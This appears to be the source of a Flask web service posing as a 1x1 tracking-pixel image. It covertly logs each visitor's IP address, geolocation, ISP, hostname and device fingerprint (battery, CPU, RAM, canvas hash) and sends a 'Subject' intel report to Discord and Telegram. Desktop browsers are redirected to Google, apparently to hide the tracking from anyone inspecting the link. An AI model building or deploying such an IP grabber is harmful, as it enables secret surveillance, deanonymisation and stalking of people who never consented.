import os
from flask import Flask, request, send_file, redirect
import requests
from datetime import datetime
import io
import json
import socket

app = Flask(__name__)

# --- CONFIGURATION ---
DISCORD_WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK_URL')
ABUSEIPDB_KEY = os.environ.get('ABUSEIPDB_KEY')
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

# 1x1 pixel ki transparent GIF image
PIXEL_BYTES = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'

# --- Notification Functions with better error handling ---
def send_to_discord(embed):
    if not DISCORD_WEBHOOK_URL:
        print("LOG: Discord Webhook URL not found, skipping.")
        return
    try:
        print("LOG: Attempting to send to Discord...")
        response = requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
        response.raise_for_status() # Agar 4xx ya 5xx error ho to exception raise karega
        print("LOG: Discord notification sent successfully.")
    except Exception as e:
        print(f"FATAL ERROR (Discord): {e}")

def send_to_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("LOG: Telegram credentials not found, skipping.")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = { 'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'Markdown' }
    try:
        print("LOG: Attempting to send to Telegram...")
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
        print("LOG: Telegram notification sent successfully.")
    except Exception as e:
        print(f"FATAL ERROR (Telegram): {e}")

# --- Main Logging Route ---
@app.route('/assets/tracker.gif')
def track():
    print("\n--- LOG: Request Received ---")
    try:
        user_agent = request.headers.get('User-Agent', 'Unknown')
        if 'Windows' in user_agent or 'Macintosh' in user_agent or ('Linux' in user_agent and 'Android' not in user_agent):
            print(f"LOG: Desktop user detected. Redirecting. UA: {user_agent}")
            return redirect("https://www.google.com", code=302)

        raw_ip_list = request.headers.get('X-Forwarded-For', request.remote_addr)
        ip_address = raw_ip_list.split(',')[0].strip()
        print(f"LOG: Processing IP: {ip_address}")
        
        username = request.args.get('username', 'Guest')
        avatar_url = request.args.get('avatar', '')
        user_message = request.args.get('message', 'N/A')
        visitor_type = "Returning ♻️" if request.args.get('isNew') == 'false' else "New ✨"
        screen_res, os_type, browser, cpu_cores, ram, battery_level, is_charging, is_touch, timezone, languages, ad_blocker, network_speed, canvas_hash, referrer = [request.args.get(k, 'N/A') for k in ['screen', 'os', 'browser', 'cpu', 'ram', 'battery_level', 'charging_status', 'touch', 'timezone', 'langs', 'adBlock', 'speed', 'canvas']] + [request.headers.get('Referer', 'Direct Visit')]
        is_touch = 'Yes' if is_touch == 'true' else 'No'
        ad_blocker_status = 'Detected 🛡️' if ad_blocker == 'true' else 'Not Detected 🟢'
        
        geo_info, asn_info, hostname, threat_level, risk_color, abuse_score = "N/A", "N/A", "N/A", "Low ✅", 3066993, 0
        try:
            response_geo = requests.get(f"http://ip-api.com/json/{ip_address}?fields=status,message,country,countryCode,city,isp,as,query", timeout=5)
            if response_geo.status_code == 200 and response_geo.json().get('status') == 'success':
                data = response_geo.json()
                city, country_code, isp, asn_str = data.get('city', 'N/A'), data.get('countryCode', 'N/A'), data.get('isp', 'N/A'), data.get('as', 'N/A')
                flag_emoji = "".join(chr(ord(c.upper()) + 127397) for c in country_code) if country_code and country_code != 'N/A' else ""
                geo_info = f"{flag_emoji} {city}, {country_code}"
                asn_info = f"{isp}\n({asn_str.split(' ')[0]})"
                if any(word in asn_info.lower() for word in ['vpn', 'proxy', 'hosting', 'datacenter']):
                    threat_level, risk_color = "Medium 🟨 (VPN/Proxy Host)", 15844367
        except Exception as e: print(f"ERROR ip-api: {e}")
        try: hostname = socket.gethostbyaddr(ip_address)[0]
        except Exception: hostname = "Not Found"
        if ABUSEIPDB_KEY:
            try:
                response_abuse = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip_address}", headers={'Key': ABUSEIPDB_KEY, 'Accept': 'application/json'}, timeout=5)
                if response_abuse.status_code == 200:
                    data = response_abuse.json()['data']
                    abuse_score = data.get('abuseConfidenceScore', 0)
                    if data.get('isTor'): threat_level, risk_color = "Critical 🚨 (Tor Exit Node)", 15158332
                    elif abuse_score > 75: threat_level, risk_color = f"High 🟥 ({abuse_score}% Abuse Score)", 15158332
                    elif abuse_score > 25 and risk_color != 15158332: threat_level, risk_color = f"Medium 🟨 ({abuse_score}% Abuse Score)", 15844367
            except Exception as e: print(f"ERROR AbuseIPDB: {e}")
        else: abuse_score = "API Key Missing"

        discord_embed = { "author": { "name": f"Holland Intel Report: {visitor_type} Visitor", "icon_url": "https://i.imgur.com/M6yB8oA.png" }, "description": f"**Subject:** `{username}`\n**IP Address:** `{ip_address}`\n**Threat Assessment:** **{threat_level}**", "color": risk_color, "thumbnail": { "url": avatar_url }, "fields": [ { "name": "📍 Location", "value": f"`{geo_info}`", "inline": True }, { "name": "🏢 Network Operator", "value": f"`{asn_info}`", "inline": True }, { "name": "🛡️ Abuse Score", "value": f"`{abuse_score}%`", "inline": True }, { "name": "💻 Client Profile", "value": f"**OS:** `{os_type}`\n**Browser:** `{browser}`\n**Screen:** `{screen_res}`", "inline": True }, { "name": "⚙️ Hardware & Network", "value": f"**CPU/RAM:** `{cpu_cores}c` / `{ram}GB`\n**Speed:** `{network_speed} Mbps`\n**Battery:** `{battery_level}` (`{is_charging}`)", "inline": True }, { "name": "💬 User Message", "value": f"> {user_message}" if user_message != 'N/A' else "> No message left.", "inline": False }, ], "footer": { "text": f"Canvas: {canvas_hash} | Hostname: {hostname}" } }
        telegram_message = (f"*{visitor_type} Visitor*\n\n" f"👤 *Subject:* `{username}`\n" f"🌐 *IP Address:* `{ip_address}`\n" f"🚨 *Threat Assessment:* *{threat_level}*\n\n" f"*📍 Location:* `{geo_info}`\n" f"*🏢 Network:* `{asn_info}`\n" f"*💻 Device:* `{os_type} | {browser}`\n" f"*💬 Message:* `{user_message}`")

        send_to_discord(discord_embed)
        send_to_telegram(telegram_message)
        print("--- LOG: Request Processed Successfully ---")
        return send_file(io.BytesIO(PIXEL_BYTES), mimetype='image/gif')

    except Exception as e:
        print(f"--- UNHANDLED FATAL ERROR in track function: {e} ---")
        return "An internal error occurred", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
